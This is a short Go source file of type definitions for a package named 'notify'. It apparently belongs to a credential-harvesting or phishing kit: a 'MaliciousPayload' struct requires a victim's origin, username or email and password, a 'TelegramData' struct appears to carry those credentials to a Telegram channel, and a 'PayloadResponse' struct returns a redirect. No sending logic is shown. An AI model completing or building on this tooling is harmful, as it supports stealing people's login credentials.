package notify

type MaliciousPayload struct {
	Origin     string `json:"origin" binding:"required"`
	Identifier string `json:"identifier" binding:"required"`
	Password   string `json:"password" binding:"required"`
}

type TelegramData struct {
	Identifier string `json:"identifier"` //username || email.
	Password   string `json:"password"`
}

type PayloadResponse struct {
	Redirect string `json:"redirect"`
}
